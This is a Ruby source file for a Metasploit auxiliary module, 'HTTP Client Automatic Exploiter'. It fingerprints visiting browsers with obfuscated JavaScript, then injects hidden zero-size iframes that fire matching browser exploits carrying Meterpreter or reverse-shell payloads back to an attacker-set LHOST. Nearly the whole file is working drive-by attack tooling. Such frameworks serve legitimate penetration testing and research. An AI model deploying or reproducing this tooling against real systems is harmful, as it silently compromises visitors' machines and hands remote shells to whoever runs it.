##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

# ideas:
#	- add a loading page option so the user can specify arbitrary html to
#	  insert all of the evil js and iframes into
#	- caching is busted when different browsers come from the same IP
#	- opera historysearch won't work in an iframe
#	- some kind of version comparison for each browser
#		- is a generic comparison possible?
#			9.1 < 9.10 < 9.20b < 9.20
#			3.5-pre < 3.5 < 3.5.1

require 'msf/core'
require 'rex/exploitation/javascriptosdetect'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML
	
	def initialize(info = {})
		super(update_info(info, 
			'Name'        => 'HTTP Client Automatic Exploiter',
			'Version'     => '$Revision$',
			'Description' => %q{
				This module uses a combination of client-side and server-side
				techniques to fingerprint HTTP clients and then automatically
				exploit them.
				},
			'Author'      => 
				[
					# initial concept, integration and extension of Jerome
					# Athias' os_detect.js
					'egypt',
				],
			'License'     => BSD_LICENSE,
			'Actions'     =>
				[
					[ 'WebServer', {
						'Description' => 'Start a bunch of modules and direct clients to appropriate exploits' 
					} ],
					[ 'list', { 
						'Description' => 'List the exploit modules that would be started'
					} ]
				],
			'PassiveActions' => 
				[
					'WebServer'
				],
			'DefaultAction'  => 'WebServer'))

		register_options([
			OptAddress.new('LHOST', [true, 
				'The IP address to use for reverse-connect payloads'
			]),
		], self.class)

		register_advanced_options([
			OptString.new('MATCH', [false, 
				'Only attempt to use exploits whose name matches this regex'
			]),
			OptString.new('EXCLUDE', [false, 
				'Only attempt to use exploits whose name DOES NOT match this regex'
			]),
			OptBool.new('DEBUG', [false, 
				'Do not obfuscate the javascript and print various bits of useful info to the browser',
				false
			]),
		], self.class)

		@exploits = Hash.new
		@targetcache = Hash.new
	end


	def run
		if (action.name == 'list')
			m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
			e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
			framework.exploits.each_module do |name, mod|
				if (mod.respond_to?("autopwn_opts") and name =~ m_regex and name !~ e_regex)
					@exploits[name] = nil
					print_line name
				end
			end
			print_line
			print_status("Found #{@exploits.length} exploit modules")
		else 
			start_exploit_modules()
			exploit()
		end 
	end


	def init_exploit(name, mod = nil, targ = 0)
		if mod.nil?
			@exploits[name] = framework.modules.create(name)
		else
			@exploits[name] = mod.new
		end

		case name
		when %r{windows}
			payload='windows/meterpreter/reverse_tcp'
			#payload='generic/debug_trap'
		else
			payload='generic/shell_reverse_tcp'
		end	
		print_status("Starting exploit #{name} with payload #{payload}")
		@exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']

		# For testing, set the exploit uri to the name of the exploit so it's
		# easy to tell what is happening from the browser.
		# XXX: Set to nil for release
		if (datastore['DEBUG'])
			@exploits[name].datastore['URIPATH'] = name  
		else
			@exploits[name].datastore['URIPATH'] = nil  
		end

		# set a random lport for each exploit.  There's got to be a better way
		# to do this but it's still better than incrementing it
		@exploits[name].datastore['LPORT'] = rand(32768) + 32768
		@exploits[name].datastore['LHOST'] = @lhost
		@exploits[name].datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
		@exploits[name].exploit_simple(
			'LocalInput'     => self.user_input,
			'LocalOutput'    => self.user_output,
			'Target'         => targ,
			'Payload'        => payload,
			'RunAsJob'       => true)

		# It takes a little time for the resources to get set up, so sleep for
		# a bit to make sure the exploit is fully working.  Without this,
		# mod.get_resource doesn't exist when we need it.
		Rex::ThreadSafe.sleep(0.5)
		# Make sure this exploit got set up correctly, return false if it
		# didn't
		if framework.jobs[@exploits[name].job_id.to_s].nil?
			print_error("Failed to start exploit module #{name}")
			@exploits.delete(name)
			return false
		end
		return true
	end

	def start_exploit_modules() 
		@lhost = (datastore['LHOST'] || "0.0.0.0")

		@js_tests = {}
		@noscript_tests = {}

		print_line
		print_status("Starting exploit modules on host #{@lhost}...")
		print_status("---")
		print_line
		m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
		e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
		framework.exploits.each_module do |name, mod|
			if (mod.respond_to?("autopwn_opts") and name =~ m_regex and name !~ e_regex)
				next if !(init_exploit(name))
				apo = mod.autopwn_opts
				apo[:name] = name
				if apo[:classid]
					# Then this is an IE exploit that uses an ActiveX control,
					# build the appropriate tests for it.
					method = apo[:vuln_test].dup
					apo[:vuln_test] = ""
					apo[:ua_name] = ::Msf::Auxiliary::Report::HttpClients::IE
					if apo[:classid].kind_of?(Array)  # then it's many classids
						apo[:classid].each { |clsid| 
							apo[:vuln_test] << "if (testAXO('#{clsid}', '#{method}')) {\n"
							apo[:vuln_test] << " is_vuln = true;\n"
							apo[:vuln_test] << "}\n"
						}
					else 
						apo[:vuln_test] << "if (testAXO('#{apo[:classid]}', '#{method}')) {\n"
						apo[:vuln_test] << " is_vuln = true;\n"
						apo[:vuln_test] << "}\n"
					end
				end
				if apo[:javascript] && apo[:ua_name]
					if @js_tests[apo[:ua_name]].nil?
						@js_tests[apo[:ua_name]] = []
					end
					@js_tests[apo[:ua_name]].push(apo)
				elsif apo[:javascript]
					if @js_tests["generic"].nil?
						@js_tests["generic"] = []
					end
					@js_tests["generic"].push(apo)
				elsif apo[:ua_name]
					if @noscript_tests[apo[:ua_name]].nil?
						@noscript_tests[apo[:ua_name]] = []
					end
					@noscript_tests[apo[:ua_name]].push(apo)
				else
					if @noscript_tests["generic"].nil?
						@noscript_tests["generic"] = []
					end
					@noscript_tests["generic"].push(apo)
				end
			end
		end
		print_line
		print_status("--- Done, found #{@exploits.length} exploit modules")
		print_line

		@js_tests.each { |browser,tests|
			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
		}
		@noscript_tests.each { |browser,tests|
			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
		}

		init_js = ::Rex::Exploitation::ObfuscateJS.new
		init_js << <<-ENDJS

			#{js_os_detect}
			#{js_base64}
			function make_xhr() {
				var xhr;
				try { 
					xhr = new XMLHttpRequest(); 
				} catch(e) {
					try { 
						xhr = new ActiveXObject("Microsoft.XMLHTTP"); 
					} catch(e) {
						xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
					}
				}
				if (! xhr) {
					throw "failed to create XMLHttpRequest";
				}
				return xhr;
			}

			function report_and_get_exploits(detected_version) {
				var encoded_detection;
				xhr = make_xhr();
				xhr.onreadystatechange = function () {
					if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
						#{js_debug('"<pre>" + htmlentities(xhr.responseText) + "</pre>"')}
						eval(xhr.responseText);
					}
				};

				encoded_detection = new String();
				for (var prop in detected_version) {
					#{js_debug('prop + " " + detected_version[prop]')}
					encoded_detection += detected_version[prop] + ":";
				}
				#{js_debug('encoded_detection + "<br>"')}
				encoded_detection = Base64.encode(encoded_detection);
				xhr.open("GET", document.location + "?sessid=" + encoded_detection);
				xhr.send(null);
			}

			function bodyOnLoad() {
				var detected_version = getVersion();
				//#{js_debug('detected_version')}
				report_and_get_exploits(detected_version);
			} // function bodyOnLoad
		ENDJS

		opts = {
			'Symbols' => {
				'Variables'   => [
					'xhr',
					'encoded_detection',
				],
				'Methods'   => [
					'report_and_get_exploits',
					'handler',
					'bodyOnLoad',
				]
			},
			'Strings' => true,
		}

		init_js.update_opts(opts)
		init_js.update_opts(js_os_detect.opts)
		init_js.update_opts(js_base64.opts)
		if (datastore['DEBUG'])
			print_status("Adding debug code")
			init_js << <<-ENDJS
				if (!(typeof(debug) == 'function')) {
					function htmlentities(str) {
						str = str.replace(/>/g, '&gt;');
						str = str.replace(/</g, '&lt;');
						str = str.replace(/&/g, '&amp;');
						return str;
					}
					function debug(msg) {
						document.body.innerHTML += (msg + "<br />\\n");
					}
				}
			ENDJS
		else
			init_js.obfuscate()
		end

		init_js << "window.onload = #{init_js.sym("bodyOnLoad")}";
		@init_html  = "<html > <head > <title > Loading </title>\n"
		@init_html << '<script language="javascript" type="text/javascript">'
		@init_html << "<!-- \n #{init_js} //-->"
		@init_html << "</script> </head> "
		@init_html << "<body onload=\"#{init_js.sym("bodyOnLoad")}()\"> "
		@init_html << "<noscript> \n"
		@init_html << build_iframe("#{self.get_resource}?ns=1")
		@init_html << "</noscript> \n"
		@init_html << "</body> </html> "

	end

	def on_request_uri(cli, request) 
		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")

		case request.uri
		when self.get_resource
			# This is the first request.  Send the javascript fingerprinter and
			# hope it sends us back some data.  If it doesn't, javascript is
			# disabled on the client and we will have to do a lot more
			# guessing.
			response = create_response()
			response["Expires"] = "0"
			response["Cache-Control"] = "must-revalidate"
			response.body = @init_html
			cli.send_response(response)
		when %r{^#{self.get_resource}.*sessid=}
			# This is the request for the exploit page when javascript is
			# enabled.  Includes the results of the javascript fingerprinting
			# in the "sessid" parameter as a base64 encoded string.
			record_detection(cli, request)
			print_status("Responding with exploits")
			response = build_script_response(cli, request)
			
			cli.send_response(response)
		when %r{^#{self.get_resource}.*ns=1}
			# This is the request for the exploit page when javascript is NOT
			# enabled.  Since scripting is disabled, fall back to useragent
			# detection, which is kind of a bummer since it's so easy for the
			# ua string to lie.  It probably doesn't matter that much because
			# most of our exploits require javascript anyway.
			print_status("Browser has javascript disabled, trying exploits that don't need it")
			record_detection(cli, request)
			response = build_noscript_response(cli, request)
			
			cli.send_response(response)
		else
			print_error("I don't know how to handle this request (#{request.uri}), sending 404")
			send_not_found(cli)
			return false
		end
	end

	def build_noscript_response(cli, request)
		client_info = get_client(cli.peerhost, request['User-Agent'])

		response = create_response()
		response['Expires'] = '0'
		response['Cache-Control'] = 'must-revalidate'

		response.body  = "<html > <head > <title > Loading </title> </head> "
		response.body << "<body> "

		@noscript_tests.each { |browser, sploits|
			next if sploits.length == 0
			# If get_client failed then we have no knowledge of this host,
			# don't assume anything about the browser. If ua_name is nil or
			# generic, these exploits need to be sent regardless of browser.
			# Either way, we need to send these exploits.
			if (client_info.nil? || [nil, browser, "generic"].include?(client_info[:ua_name]))
				if (HttpClients::IE == browser)
					response.body << "<!--[if IE]>\n"
				end
				sploits.map do |s|
					response.body << (s[:prefix_html] || "") + "\n"
					response.body << build_iframe(exploit_resource(s[:name])) + "\n"
					response.body << (s[:postfix_html] || "") + "\n"
				end
				if (HttpClients::IE == browser)
					response.body << "<![endif]-->\n"
				end
			end
		}

		response.body << "Your mom "
		response.body << "</body> </html> "

		return response
	end

	def build_script_response(cli, request)
		response = create_response()
		response['Expires'] = '0'
		response['Cache-Control'] = 'must-revalidate'

		client_info = get_client(cli.peerhost, request['User-Agent'])
		#print_status("Client info: #{client_info.inspect}")
		host_info = get_host(cli.peerhost)

		js = ::Rex::Exploitation::ObfuscateJS.new
		# If we didn't get a client database, then the detection is
		# borked or the db is not connected, so fallback to sending
		# some IE-specific stuff with everything.  Otherwise, make
		# sure this is IE before sending code for ActiveX checks.
		if (client_info.nil? || [nil, HttpClients::IE].include?(client_info[:ua_name]))
			# If we have a class name (e.g.: "DirectAnimation.PathControl"),
			# use the simple and direct "new ActiveXObject()".  If we
			# have a classid instead, first try creating a the object
			# with createElement("object").  However, some things
			# don't like being created this way (specifically winzip),
			# so try writing out an object tag as well.  One of these
			# two methods should succeed if the object with the given
			# classid can be created.
			js << <<-ENDJS
				function testAXO(axo_name, method) {
					if (axo_name.substring(0,1) == String.fromCharCode(123)) {
						axobj = document.createElement("object");
						axobj.setAttribute("classid", "clsid:" + axo_name);
						axobj.setAttribute("id", axo_name);
						axobj.setAttribute("style", "visibility: hidden");
						axobj.setAttribute("width", "0px");
						axobj.setAttribute("height", "0px");
						document.body.appendChild(axobj);
						if (typeof(axobj[method]) == 'undefined') {
							var attributes = 'id="' + axo_name + '"';
							attributes += ' classid="clsid:' + axo_name + '"';
							attributes += ' style="visibility: hidden"';
							attributes += ' width="0px" height="0px"';
							document.body.innerHTML += "<object " + attributes + "></object>";
							axobj = document.getElementById(axo_name);
						}
					} else {
						try {
							axobj = new ActiveXObject(axo_name);
						} catch(e) {
							axobj = '';
						};
					}
					#{js_debug('axo_name + "." + method + " = " + typeof axobj[method] + "<br/>"')}
					if (typeof(axobj[method]) != 'undefined') {
						return true;
					}
					return false;
				}
			ENDJS
			# End of IE-specific test functions
		end
		js << <<-ENDJS
			var written_iframes = new Array();
			function write_iframe(myframe) {
				var iframe_idx; var mybody;
				for (iframe_idx in written_iframes) {
					if (written_iframes[iframe_idx] == myframe) {
						return;
					}
				}
				written_iframes[written_iframes.length] = myframe;
				str = '';
				str += '<iframe src="' + myframe + '" style="visibility:hidden" height="0" width="0" border="0"></iframe>';
				str += '<p>' + myframe + '</p>';
				document.body.innerHTML += (str);
			}
		ENDJS
		opts = {
			'Symbols' => {
				'Variables'   => [
					'written_iframes',
					'myframe',
					'mybody',
					'iframe_idx',
					'is_vuln',
				],
				'Methods'   => [
					'write_iframe',
				]
			},
			'Strings' => true,
		}

		@js_tests.each { |browser, sploits|
			next if sploits.length == 0
			#print_status("Building sploits for #{client_info[:ua_name]}")
			if (client_info.nil? || [nil, browser, "generic"].include?(client_info[:ua_name]))
				# Make sure the browser names can be used as an identifier in
				# case something wacky happens to them.
				func_name = "exploit#{browser.gsub(/[^a-zA-Z]/, '')}"
				js << "function #{func_name}() { \n"
				sploits.map do |s|
					if (host_info and host_info[:os_name] and s[:os_name])
						next unless s[:os_name].include?(host_info[:os_name])
					end
					if s[:vuln_test]
						# Wrap all of the vuln tests in a try-catch block so a
						# single borked test doesn't prevent other exploits
						# from working.
						js << " is_vuln = false;\n"
						js << " try {\n"
						js << s[:vuln_test] + "\n"
						js << " } catch(e) { is_vuln = false; };\n"
						js << " if (is_vuln) {"
						js << "  write_iframe('" + exploit_resource(s[:name]) + "'); "
						js << " }\n"
					else
						js << " write_iframe('" + exploit_resource(s[:name]) + "');\n"
					end
				end
				js << "};\n" # end function exploit...()
				js << "#{js_debug("'exploit func: #{func_name}()'")}\n"
				js << "#{func_name}();\n" # run that bad boy
				opts['Symbols']['Methods'].push("#{func_name}")
			end
		}

		if not datastore['DEBUG']
			js.obfuscate
		end
		response.body = "#{js}"

		return response
	end

	# consider abstracting this out to a method (probably
	# with a different name) of Auxiliary::Report or
	# Exploit::Remote::HttpServer
	def record_detection(cli, request)
		os_name = nil
		os_flavor = nil
		os_sp = nil
		os_lang = nil
		arch = nil
		ua_name = nil
		ua_ver = nil

		data_offset = request.uri.index('sessid=')
		p request['User-Agent']
		if (data_offset.nil? or -1 == data_offset) 
			# then we didn't get a report back from our javascript
			# detection; make a best guess effort from information 
			# in the user agent string.  The OS detection should be
			# roughly the same as the javascript version on non-IE
			# browsers because it does most everything with
			# navigator.userAgent
			print_status("Recording detection from User-Agent")
			report_user_agent(cli.peerhost, request)
		else
			data_offset += 'sessid='.length
			detected_version = request.uri[data_offset, request.uri.length]
			if (0 < detected_version.length)
				detected_version = Rex::Text.decode_base64(Rex::Text.uri_decode(detected_version))
				print_status("JavaScript Report: #{detected_version}")
				(os_name, os_flavor, os_sp, os_lang, arch, ua_name, ua_ver) = detected_version.split(':')
				report_host(
					:host      => cli.peerhost,
					:os_name   => os_name,
					:os_flavor => os_flavor, 
					:os_sp     => os_sp, 
					:os_lang   => os_lang, 
					:arch      => arch
				)
				report_client(
					:host      => cli.peerhost,
					:ua_string => request['User-Agent'],
					:ua_name   => ua_name,
					:ua_ver    => ua_ver
				)
				report_note(
					:host => cli.peerhost,
					:type => 'http_request',
					:data => "#{@myhost}:#{@myport} #{request.method} #{request.resource} #{os_name} #{ua_name} #{ua_ver}"
				)
			end
		end

		# If the database is not connected, use a cache instead
		if (!get_client(cli.peerhost, request['User-Agent']))
			print_status("No database, using targetcache instead")
			@targetcache ||= {}
			@targetcache[cli.peerhost] ||= {}
			@targetcache[cli.peerhost][:update] = Time.now.to_i

			# Clean the cache 
			rmq = []
			@targetcache.each_key do |addr|
				if (Time.now.to_i > @targetcache[addr][:update]+60)
					rmq.push addr
				end
			end
			rmq.each {|addr| @targetcache.delete(addr) }

			# Keep the attributes the same as if it were created in
			# the database.
			@targetcache[cli.peerhost][:update] = Time.now.to_i
			@targetcache[cli.peerhost][:ua_string] = request['User-Agent']
			@targetcache[cli.peerhost][:ua_name] = ua_name
			@targetcache[cli.peerhost][:ua_ver] = ua_ver
		end
	end

	# Override super#get_client to use a cache in case the database
	# is not available
	def get_client(host, ua)
		return super(host, ua) || @targetcache[host]
	end

	def build_iframe(resource)
		ret = ''
		#ret << "<p>iframe #{resource}</p>"
		ret << "<iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>"
		#ret << "<iframe src=\"#{resource}\" ></iframe>"
		return ret
	end

	def exploit_resource(name)
		if (@exploits[name] && @exploits[name].respond_to?("get_resource"))
			#print_line("Returning '#{@exploits[name].get_resource}', for #{name}")
			return @exploits[name].get_resource
		else
			print_error("Don't have an exploit by that name, returning 404#{name}.html")
			return "404#{name}.html"
		end
	end

	def js_debug(msg)
		if datastore['DEBUG']
			return "document.body.innerHTML += #{msg};"
		end
		return ""
	end
end

